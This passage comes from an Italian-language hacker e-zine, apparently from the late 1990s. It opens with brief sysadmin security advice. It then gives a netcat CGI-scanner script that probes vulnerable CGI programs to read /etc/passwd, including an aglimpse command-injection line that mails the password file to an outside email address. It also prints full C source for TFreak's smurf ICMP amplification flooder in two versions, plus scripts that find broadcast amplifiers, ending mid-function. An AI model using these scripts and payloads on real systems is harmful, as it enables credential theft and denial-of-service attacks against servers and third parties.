history vengono linkati al file '/dev/null' per cancellare le proprie
operazioni; controllate spesso se gli utenti linkano il file di history.

Internet vi offre molti programmi che servono per migliorare la sicurezza.
Questi, pero', possono essere utilizzati sia da voi che volete trovare
eventuali falle del vostro sistema, sia dall'hacker che cerca di entrare
nel nostro server. Vediamone alcuni:

a) John The Ripper  e' un programma utilizzato per decifrare le password.
   Esso prova centinaia di password note, dal dizionario, o dal campo
   GECOS del vostro file delle password.
b) COPS e' un programma che controlla i permessi dell'intero sistema e vi
   comunica i rischi di sicurezza.
c) SATAN attacca il sistema dall'esterno della rete proprio come farebbe un
   invasore. Tuttavia al contrario dell'invasore, vi comunica i punti deboli
   e come corregerli. Esso e' stato scritto dalla stessa persona che ha
   scritto i programmi del wrapper TCP
d) TCPDUMP e' uno sniffer, e stampa il contenuto delle transazioni di rete,
   il che vi permette di controllare quello che sta succedendo sul vostro
   sistema.

Comunque vi conviene documentarvi molto sulla sicurezza. Parecchie info le
trovate nella FAQ CERT-CC dal sito info.cert.org mediante ftp anonimo.
Potete anche visitare questa pagina: http://www.first.org.first .
Questi documenti non solo vi spiegano come rendere piu' sicuro il vostro
sistema ma anche che cosa fare in caso di attacco. Se volete potete anche
controllare due newsgroup:

a) Comp.security.mix : dove si discutte delle sicurezza in UNIX
b) Comp.security.announce : dove sono pubblicate comunicazioni sulle nuove
   questioni di sicurezza, oltra a patch e pareri del CERT

Il vostro sistema e' stato attaccato e voi state molto male, come potete
impedire di attaccarvi di nuovo?

Il primo passo e' vedere quali login stanno utilizzando e cambiarne le
password. Inoltre, potete controllare il file '.rhosts' nella directory
dell'account. Controllate se hanno lasciato qualche trojan nella directory
'/bin' dell'account. Cercate di scoprire da quale nome di sistema provengono
esaminando i file di log del sistema di rete. Poi buttateli fuori eliminando
le loro shell.

Provate ad eseguire il comando finger sul nome e l'indirizzo internet
dell'invasore ma non serve a nulla se usa l'abbonamento di un altro.
Il finger lo fate cosi': 'finger aggressore@suoprovider.it'
Oppure potete inviare un messaggio di posta elettronica a root@suoprovider.it
e comunicare all'amministratore che cosa sta succedendo.

Inoltre potete eseguire il comando:

[toor@T0rment0]# whois -h rs.internic.net nome.dominio.invasore

Questo comando potrebbe fornirvi il nome di contatto del gestore di dominio.
In questo caso, potrete contattarlo e fargli sapere che uno dei suoi sistemi
viene utilizzato per attaccare gli altri sistemi. Se lo becchera' come
minimo gli chiudera' l' abbonamento.

Infine, se proprio non ci riuscite, potete contattare il CERT o il FIRST,
due team di professionisti che aiutano a sviluppare metodi di protezione
del sistema.

Ok, in questo modo ho fatto contenti anche i sysadmin e d'ora in poi non
credete che gli hacker siano quelle persone che danneggiano i sistemi.
Se avete letto questo articolo avete capito la mia mentalita', ma con cio'
saro' sempre 'un ragazzo ansioso di esplorare sistemi che mettono a dura
prova la sua bravura (se cosi' la puo' definire) '. 

##############################################################################

                "=__="=__="=__="=__="=__="
                   CGI: SCRIPT E TEORIA
                "=__="=__="=__="=__="=__="
                   
Molti bug scoperti appartengono alla categoria dei CGI,
ovvero prog o script che vengono rimasti in cartelle appartenenti
al web che non sono visibili normalmente ma si possono
richiamare mediante la richiesta.
Avete mai sentito parlare del phf???
Bene, quella era un'utility, un agendina, che veniva trattata come
un normale prog dai sysadmin ma in realta' rappresentava un exploit
che permetteva di fare un cat al file passwd, cosa permessa solo
al root. Infatti il phf era settato con i permessi di root
Ma non esiste solo il phf, anche altri.
Abbiamo anche il test-cgi che ci permette di vedere il contenuto
dell'hard disk del server vittima.
Se potremmo vedere la directory degli utenti, una volta saputo l'account
potremmo tentare un brute force pop3 ovvero usare un programma 
che prova varie password utilizzando l'account di posta di quell'utente.
Poi abbiamo campas che e' una'altra utility che se settata con i permessi
giusti, ci permette di fare un cat su qualsiasi file dell'hard disk(passwd).
C'e' view-source che se e' presente ci permette di vedere il contenuto
di qualsiasi file (passwd e' quello che ci interessa).
C'e' php.cgi che se e' presente anch'esso ci permette di vedere qualsiasi file
C'e' aglimpse che e' un utility alla quale se affiancamo una stringa
specifica puo' mandarci il file delle passwd via e-mail.
C'e' il finger, che se tenuto nella cartella del web /cgi-bin/, si puo'
richiamare attraverso un qualsiasi browser.
Poi abbiamo le varie testate HTTP per ricavare informazioni.
Se il server e' di frontpage, possiamo provare a chiederci i file service.pwd
e users.pwd nella cartella '/_vti_pvt' se sono disponibili.
Infine abbiamo www-sql , guestbook.html e guestbook.cgi che servono 
per ricavare informazioni e per vedere il libro degli ospiti di quel sito
che a volte puo rinchiudere anche delle password di utenti.
Allora, ora sappiamo tutti i vari cgi, perche' non ci costruiamo un cgi-scan?
Bene ora vi faccio vedere passo passo le istruzioni da usare nello script.
Useremo il netcat, che in questo caso funge da telnet, per collegarci alla
porta 80 e come opzioni useremo '-v' che ci da' una spiegazione dettagliata
del risultato e '-w' seguito da 5 che dice al netcat di aspettare 5 secondi,
valore che potete cambiare se non ottenete niente.
Come saprete, la sintassi della porta 80 per ricavare un dato su un server
e' 'GET /file ' dove file e' il file che vorremo vedere.
Come fare per passare questa istruzione al netcat?
Eheh, useremo il pipe. Il pipe non e' nient'altro che un reindirizzatore
di istruzioni. Per capirci meglio usiamo:

echo "GET /file" | nc -w 5 -v $1 80

L'echo serve per mandare l'input al pipe, mentre $1 significa prendi il primo
argomento specificato dalla linea di comando.

Bene, ora che sappiamo tutto, all'opera!
Nella prima riga specifichiamo la shell che ci vuole:

#!/bin/sh

Ora dovremmo usare un istruzione che controlla se e' stato specificato il
sito dalla linea di comando. Il comando 'test' e' quello che fa per noi.
Avremmo potuto usare anche un if ma il comando ' test ! "$1" ' e' piu'
raffinato. In pratica dice: "Controlla se e' presente $1, se non lo e'
dai un messaggio di errore all'utente ed esci"

test ! "$1" && echo "Non dimenticarti di darmi un sito" && exit 1

Puliamo lo schermo.

clear

Diciamo all'utente qual'e' il sito da scannerizzare.

echo "server:"
echo $1

Iniziamo:

echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "CONTROLLO WWW-SQL"
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "GET /cgi-bin/www-sql?" | nc -w 5 -v $1 80
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "CONTROLLO GUESTBOOK.HTML E GUESTBOOK.CGI"
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "GET http://$1/guestbook.html" | nc -v -w 5 $1 80
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "GET /cgi-bin/guestbook.cgi?" | nc -v -w 5 $1 80
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "CONTROLLO SERVICE.PWD"
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "GET /_vti_pvt/service.pwd"| nc -v -w 5 $1 80
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "CONTROLLO USERS.PWS"
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "GET /_vti_pvt/users.pwd" | nc -v -w 5 $1 80 
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "CONTROLLO LA TESTATA HEAD"
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "HEAD / HTTP/1.1" | nc -v -w 5 $1 80 
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "PRIMA VERSIONE DI HTTP"
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "GET / HTTP/1.0" | nc -w 5 -v $1 80 
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "SECONDA VERSIONE DI HTTP"
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "GET / HTTP/1.1" | nc -w 5 -v $1 80
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "TERZA VERSIONE DI HTTP"
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "GET / HTTP/0.9" | nc -w 5 -v $1 80
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "CONTROLLO AGLIMPSE."
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "GET /cgi-bin/aglimpse/80|IFS=5;CMD=5mail5asmasm\@hotmail.com\</etc/passwd;eval$CMD;echo HTTP /1.0" | nc -v -w 5 $1 80 
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "CONTROLLO IL MAN"
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "GET /cgi-bin/man.sh?" | nc -w 5 -v $1 80 
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "VEDO LA DIRECTORY //cgi-bin/"
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "GET //cgi-bin/" | nc -v -w 5 $1 80 
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "CONTROLLO IL VIEW-SOURCE"
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "GET /cgi-bin/view-source?../../../../../../../etc/passwd'" | nc -v -w 5 $1 80  
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "CONTROLLO IL PHP.CGI"
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "GET /cgi-bin/php.cgi?/etc/passwd" | nc -v -w 5 $1 80
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "CONTROLLO IL FINGER"
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "GET /cgi-bin/finger?@localhost" | nc -v -w 5 $1 80 
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "CONTROLLO IL CAMPAS"
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "GET /cgi-bin/campas?%0acat%0a/etc/passwd%0a" | nc -v -w 5 $1 80
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "CONTROLLO IL PHF (IHIH!) "
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "GET /cgi-bin/phf?Qname=root%0Acat%20/etc/passwd%20" | nc -v -w 3 $1 80 
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "CONTROLLO IL TEST-CGI"
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "PRIMO TEST"
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "GET /cgi-bin/test-cgi?/*" | nc -v -w 3 $1 80 
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "SECONDO TEST"
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "GET /cgi-bin/test-cgi?*" | nc -v -w 3 $1 80 
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "TERZO TEST"
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "GET /cgi-bin/nph-test-cgi?*" | nc -v -w 3 $1 80 
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "QUARTO TEST"
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "GET /cgi-bin/test-cgi?x *"  | nc -v -w 3 $1 80 
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "QUINTO TEST"
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "GET /cgi-bin/nph-test-cgi?x *" | nc -v -w 3 $1 80 
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "SESTO TEST"
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "GET /cgi-bin/test-cgi?x" | nc -v -w 3 $1 80 
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "SETTIMO TEST"
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "GET /cgi-bin/nph-test-cgi?x" | nc -v -w 3 $1 80 
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "OTTAVO TEST"
echo "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo "GET /cgi-bin/nph-test-cgi?/*" | nc -v -w 3 $1 80
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo "Ho finito ;)."

Aspetto 3 secondi.

sleep 3

Ok, non l'ho commentato assai nel mezzo perche' vi ho spiegato prima
a cosa servivano quelle istruzioni. 
Se volete usare una lista di siti invece di uno solo, basta che inseriate
dopo la riga dell'istruzione 'test' il seguente ciclo

for target in 'cat $1' do

Pero' non dimenticatevi di cambiare tutti gli $1 delle istruzioni in $target,
infatti se rimmarrete $1 il netcat non trovera' niente visto che fara'
lo scan su un dominio inesistente. Ah, se usate il ciclo for dovrete chiuderlo
con l'istruzione 'done' che potete aggiungere alla fine del programma.
Ok io il mio lavoro l'ho fatto, ora tocca a voi sbizzarirvi!

##############################################################################

           SmuRfSmuRf SmuRfSmuRf
           SmuRf-- SMURF --SmuRf
           SmuRfSmuRf SmuRfSmuRf

Quando di voi quando sentono questa parola arricciano il naso?
Mi siete sempre chiesti cosa sia lo smurf, come funziona, quali sono
gli effetti e come proteggersi? T0rment0 sta qui X voi!
Lo `smurf' attack e' veramente semplice.
Esso usa una lista di indirizzi di broadcast, ovvero quando lo avviamo
deve essere specificato un file nel quale sono contenuti molti indirizzi
che piu' veloci sono meglio e', che memorizza i domini dentro ad un array
, e manda un icmp di echo request spoffato ad ognuno di questi indirizzi
e ricomincia.  Il risultato e' un attacco devastante all'ip spoffato
alla quale risponderanno moltissimi computer all'echo request

Ora che sai come funziona, ti chiedi come puoi proteggerti, o no?
Bene, sfortunatamente non sono sicuro di come e se e' possibile farlo
potresti configurare il router in modo che rifiuti tutto
il traffico icmp pero' non e' buona soluzione perche' rende le altre utilita'
inutilizzabili(come il ping e il traceroute).
Per prevenire il tuo server dall'essere usato per floddare
e' molto facile e non reca grandi perdite al tuo server.
Se filtri tutto il traffico icmp agli indirizzi broadcast
al router nessuna macchina rispondera' e l'attacco non funzionera'
Questo puo' essere fatto mettendo una linea nel router. La soluzione
completa, se vi interessa, la trovate su:

        http://www.internetnews.com/isp-news/1997/10/0901-mci.html

/* Smurf4.c by TFreak */

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

void banner(void);
void usage(char *);
void smurf(int, struct sockaddr_in, u_long, int);
void ctrlc(int);
unsigned short in_chksum(u_short *, int);

/* stamp */
char id[] = "$Id smurf.c,v 4.0 1997/10/11 13:02:42 EST tfreak Exp $";

int main (int argc, char *argv[])
{
   struct sockaddr_in sin;
   struct hostent *he;
   FILE   *bcastfile;
   int    i, sock, bcast, delay, num, pktsize, cycle = 0, x;
   char   buf[32], **bcastaddr = malloc(8192);

   banner();
   signal(SIGINT, ctrlc);

   if (argc < 6) usage(argv[0]);

   if ((he = gethostbyname(argv[1])) == NULL) {
      perror("resolving source host");
      exit(-1);
   }
   memcpy((caddr_t)&sin.sin_addr, he->h_addr, he->h_length);
   sin.sin_family = AF_INET;
   sin.sin_port = htons(0);

   num = atoi(argv[3]);
   delay = atoi(argv[4]);
   pktsize = atoi(argv[5]);

   if ((bcastfile = fopen(argv[2], "r")) == NULL) {
      perror("opening bcast file");
      exit(-1);
   }
   x = 0;
   while (!feof(bcastfile)) {
      fgets(buf, 32, bcastfile);
      if (buf[0] == '#' || buf[0] == '\n' || ! isdigit(buf[0])) continue;
      for (i = 0; i < strlen(buf); i++)
          if (buf[i] == '\n') buf[i] = '\0';
      bcastaddr[x] = malloc(32);
      strcpy(bcastaddr[x], buf);
      x++;
   }
   bcastaddr[x] = 0x0;
   fclose(bcastfile);

   if (x == 0) {
      fprintf(stderr, "ERROR: no broadcasts found in file %s\n\n", argv[2]);
      exit(-1);
   }
   if (pktsize > 1024) {
      fprintf(stderr, "ERROR: packet size must be < 1024\n\n");
      exit(-1);
   }

   if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
      perror("getting socket");
      exit(-1);
   }
   setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char *)&bcast, sizeof(bcast));

   printf("Flooding %s (. = 25 outgoing packets)\n", argv[1]);

   for (i = 0; i < num || !num; i++) {
      if (!(i % 25)) { printf("."); fflush(stdout); }
      smurf(sock, sin, inet_addr(bcastaddr[cycle]), pktsize);
      cycle++;
      if (bcastaddr[cycle] == 0x0) cycle = 0;
      usleep(delay);
   }
   puts("\n\n");
   return 0;
}

void banner (void)
{
   puts("\nsmurf.c v4.0 by TFreak\n");
}

void usage (char *prog)
{
   fprintf(stderr, "usage: %s <target> <bcast file> "
                   "<num packets> <packet delay> <packet size>\n\n"
                   "target        = address to hit\n"
                   "bcast file    = file to read broadcast addresses from\n"
                   "num packets   = number of packets to send (0 = flood)\n"
                   "packet delay  = wait between each packet (in ms)\n"
                   "packet size   = size of packet (< 1024)\n\n", prog);
   exit(-1);
}

void smurf (int sock, struct sockaddr_in sin, u_long dest, int psize)
{
   struct iphdr *ip;
   struct icmphdr *icmp;
   char *packet;

   packet = malloc(sizeof(struct iphdr) + sizeof(struct icmphdr) + psize);
   ip = (struct iphdr *)packet;
   icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

   memset(packet, 0, sizeof(struct iphdr) + sizeof(struct icmphdr) + psize);

   ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + psize);
   ip->ihl = 5;
   ip->version = 4;
   ip->ttl = 255;
   ip->tos = 0;
   ip->frag_off = 0;
   ip->protocol = IPPROTO_ICMP;
   ip->saddr = sin.sin_addr.s_addr;
   ip->daddr = dest;
   ip->check = in_chksum((u_short *)ip, sizeof(struct iphdr));
   icmp->type = 8;
   icmp->code = 0;
   icmp->checksum = in_chksum((u_short *)icmp, sizeof(struct icmphdr) + psize);

   sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct icmphdr) + psize,
          0, (struct sockaddr *)&sin, sizeof(struct sockaddr));

   free(packet);           /* free willy! */
}

void ctrlc (int ignored)
{
   puts("\nDone!\n");
   exit(1);
}

unsigned short in_chksum (u_short *addr, int len)
{
   register int nleft = len;
   register int sum = 0;
   u_short answer = 0;

   while (nleft > 1) {
      sum += *addr++;
      nleft -= 2;
   }

   if (nleft == 1) {
      *(u_char *)(&answer) = *(u_char *)addr;
      sum += answer;
   }

   sum = (sum >> 16) + (sum + 0xffff);
   sum += (sum >> 16);
   answer = ~sum;
   return(answer);
}


--------------------------------------------------------------------------------

      Spiegazione piu' semplice con esempio


Lo "smurf" attack, nome che deriva dal nome del programma,
e' uno dei piu' recenti metodi nella categoria degli attacchi contro server.
Il programma manda un grande numero di ICMP echo (ping) agli indirizzi
broadcast, facendogli credere che la richiesta venga fatta dal nostro
target, ma in realta' maschera' il nostro ip mettendogli quello della vittima.
Se il router manda i pacchetti a questi indirizzi,
molti pc collegati su quel server manderanno gli ICMP echo a quell'indirizzo
Dunque se useremo un server di broadcast che e' collegato con molti pc,
otterremo un effetto devastante con centinaia di echo request.

Correntemente i broadcast piu' soggetti a cio' sono i provider
e gli irc server.

Abbiamo cosi' due parti coinvolte in questo attacco
i server intemediari (broadcast) che sono chiamati
siti di rimbalzo, l'indirizzo spoffato dell'obiettivo, o vittima.
La vittima e' l'obbiettivo di tutto quel traffico che e' stato
generato dai server di rimbalzo.

Facciamo un esempio che vi schiarira' le idee.
Facciamo finta che come broadcast usiamo un server che ha 100 pc collegati,
e che ci troviamo dalla nostra shelluzza che ha una t1.
La shelluzza manda,diciamo, a 768kb/s un insieme di ICMP echo (ping) ,
con l'indirizzo spoffato della vittima, all'indirizzo del nostro server di
rimbalzo.  Questi pacchetti colpiscono anche i 100 pc
che sono collegati al broadcast; ognuno di essi ricevera' il pacchetto
e rispondera' ad esso, crando 100 risposte in fuoriuscita.
Se moltiplichi la velocita' per il numero deille risponde, otterrai
che 76.8 Mbps sono usati dal server di rimbalzo.
Questi bei megabaittini saranno mandati alla vittima con conseguente
svenimento del modem(suo!).

COME FARE IN MODO CHE IL VOSTRO SERVER NON VENGA USATO
COME INTERMEDIARO DELLO SMURF?

Potete trovare informazioni a riguardo su:

ftp://ftp.internic.net/internet-drafts/draft-ferguson-ingress-filtering-02.txt

----------------------------------------------------------------------------

L'autore dello smurf, TFreak, ha rilasciato anche questi due script
che servono per trovare degli indirizzi di broadcast che concedono
un insieme di echo request.
Lo script e' diviso in due parti e devono essere messi tutti e due
nella stessa directory.

--- bips.sh ---

#!/bin/bash
# find broadcast ip's that reply with 30+ dupes.

# i decided to make this script into two sections. when running this make
# sure both parts are in the same directory.

if [ $# != 1 ]; then
echo "$0 <domain - ie: college.edu>"
else
host -l $1 | grep 'has address' | cut -d' ' -f4 > $1.ips
cat $1.ips | cut -d'.' -f1-3 | sort |\
awk '{ print echo ""$1".255" }' > $1.tmp
cat $1.tmp | uniq | awk '{ print "./chekdup.sh "$1"" }' > $1.ping
rm -f $1.ips $1.tmp
chmod 700 $1.ping
./$1.ping
rm $1.ping
fi

--- chekdup.sh ---

#!/bin/bash
# this checks possible broadcast ip's for a given amount of icmp echo
# replies.

ping -c 2 $1 > $1.out
if
cat $1.out | grep dupl > /dev/null
then
export DUPES="`cat $1.out | grep dupl | cut -d'+' -f2 | cut -d' ' -f1`"
else
export DUPES=1
fi
if [ $DUPES -gt 30 ]; then
echo "$1 had $DUPES dupes" >> bips.results
rm -f $1.out
else
rm -f $1.out
fi

----Fine script----


Quello che segue e' sempre lo stesso codice di prima, solo che e' apportato
a dei sistemi operativi che hanno un minore sistema di rete, come il FreeBSD.


/*Smurf5.c by TFreak*/

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

void            banner(void);
void            usage(char *);
void            smurf(int, struct sockaddr_in, u_long, int);
void            ctrlc(int);
unsigned int    host2ip(char *hostname);
unsigned short  in_chksum(u_short *, int);

unsigned int
host2ip(char *hostname)
{
        static struct in_addr i;
        struct hostent *h;
        i.s_addr = inet_addr(hostname);
        if (i.s_addr == -1) {
                h = gethostbyname(hostname);
                if (h == NULL) {
                        fprintf(stderr, "can't find %s\n.", hostname);
                        exit(0);
                }
                bcopy(h->h_addr, (char *) &i.s_addr, h->h_length);
        }
        return i.s_addr;
}

/* stamp */
char id[] = "$Id smurf.c,v 5.0 1997/10/13 22:37:21 CDT griffin Exp $";

int
main(int argc, char *argv[])
{
    struct sockaddr_in sin;
    FILE           *bcastfile;
    int             i, sock, bcast, delay, num, pktsize, cycle = 0,
                    x;
    char            buf[32], **bcastaddr = malloc(8192);

    banner();
    signal(SIGINT, ctrlc);
    if (argc < 6)
            usage(argv[0]);

    sin.sin_addr.s_addr = host2ip(argv[1]);
    sin.sin_family = AF_INET;

    num = atoi(argv[3]);
    delay = atoi(argv[4]);
    pktsize = atoi(argv[5]);

    if ((bcastfile = fopen(argv[2], "r")) == NULL) {
            perror("opening bcast file");
            exit(-1);
    }
    x = 0;
    while (!feof(bcastfile)) {
            fgets(buf, 32, bcastfile);
            if (buf[0] == '#' || buf[0] == '\n' || !isdigit(buf[0]))
                    continue;
            for (i = 0; i < strlen(buf); i++)
                    if (buf[i] == '\n')
                            buf[i] = '\0';
            bcastaddr[x] = malloc(32);
            strcpy(bcastaddr[x], buf);
            x++;
    }
    bcastaddr[x] = 0x0;
    fclose(bcastfile);

    if (x == 0) {
      fprintf(stderr, "ERROR: no broadcasts found in file %s\n\n",argv[2]);
      exit(-1);
    }
    if (pktsize > 1024) {
            fprintf(stderr, "ERROR: packet size must be < 1024\n\n");
            exit(-1);
    }
    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
            perror("getting socket");
            exit(-1);
    }
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char *)&bcast,sizeof(bcast));

    printf("Flooding %s (. = 25 outgoing packets)\n", argv[1]);

    for (i = 0; i < num || !num; i++) {
            if (!(i % 25)) {
                    printf(".");
                    fflush(stdout);
            }
            smurf(sock, sin, inet_addr(bcastaddr[cycle]), pktsize);
            cycle++;
            if (bcastaddr[cycle] == 0x0)
                    cycle = 0;
            usleep(delay);
    }
    puts("\n\n");
    return 0;
}

void
banner(void)
{
    puts("\nsmurf.c v5.0 by TFreak, ported by Griffin\n");
}

void
usage(char *prog)
{
    fprintf(stderr, "usage: %s <target> <bcast file> "
            "<num packets> <packet delay> <packet size>\n\n"
            "target        = address to hit\n"
            "bcast file    = file to read broadcast addresses from\n"
            "num packets   = number of packets to send (0 = flood)\n"
            "packet delay  = wait between each packet (in ms)\n"
            "packet size   = size of packet (< 1024)\n\n", prog);
    exit(-1);
}

void
smurf(int sock, struct sockaddr_in sin, u_long dest, int psize)
{
    struct ip      *ip;
    struct icmp    *icmp;
    char           *packet;
    int             hincl = 1;

    packet = malloc(sizeof(struct ip) + sizeof(struct icmp) + psize);
    ip = (struct ip *) packet;
    icmp = (struct icmp *) (packet + sizeof(struct ip));

    memset(packet, 0, sizeof(struct ip) + sizeof(struct icmp) + psize);
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
    ip->ip_len = sizeof(struct ip) + sizeof(struct icmp) + psize;
    ip->ip_hl = sizeof *ip >> 2;
    ip->ip_v = 4;
    ip->ip_ttl = 255;
    ip->ip_tos = 0;
    ip->ip_off = 0;
    ip->ip_id = htons(getpid());
    ip->ip_p = 1;
    ip->ip_src.s_addr = sin.sin_addr.s_addr;
    ip->ip_dst.s_addr = dest;
    ip->ip_sum = 0;
    icmp->icmp_type = 8;
    icmp->icmp_code = 0;
    icmp->icmp_cksum = htons(~(ICMP_ECHO << 8));

    sendto(sock, packet, sizeof(struct ip) + sizeof(struct icmp) + psize,
           0, (struct sockaddr *) & sin, sizeof(struct sockaddr));

    free(packet);           /* free willy! */
}

void
ctrlc(int ignored)
{
    puts("\nDone!\n");
    exit(1);
}

unsigned short
in_chksum(u_short * addr, int len)
{
    register int    nleft = len;
    register int    sum = 0;
    u_short         answer = 0;

    while (nleft > 1) {
            sum += *addr++;
            nleft -= 2;
    }

